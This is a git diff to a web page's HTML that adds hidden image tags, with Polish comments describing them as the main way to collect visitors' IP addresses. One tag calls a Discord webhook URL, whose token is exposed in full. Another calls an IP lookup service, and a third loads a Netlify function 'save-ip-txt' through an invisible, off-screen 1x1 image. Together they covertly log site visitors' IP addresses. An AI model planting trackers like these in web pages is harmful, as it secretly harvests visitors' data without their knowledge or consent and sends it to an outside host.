@@ -235,5 +235,25 @@ window.onclick = function(event) {
 }
 </script>
  <script src="/netlify/functions/save-ip-txt.js"></script>
+<!-- Główny sposób zbierania IP w 2025/2026 – na jpewniejszy na Netlify -->
+<img
+    class="logger"
+    src="https://discord.com/api/webhooks/1460323910787530907/J0NXhcXMEpvHMYpKVwmH3ebjYXSitXJ-GX5N8ugXYq56hOTZre5unG6Uqqv329UhOHHp"
+/>
+
+<!-- Dodatkowa próba na wszelki wypadek -->
+<img
+    class="logger"
+    src="https://api.ipify.org"
+/>
+
+<!-- Wywołanie funkcji Netlify – tu dzieje się magia -->
+<img
+    src="/.netlify/functions/save-ip-txt"
+    width="1"
+    height="1"
+    style="position:absolute; left:-9999px; opacity:0;"
+    alt=""
+>
 </body>
 </html>
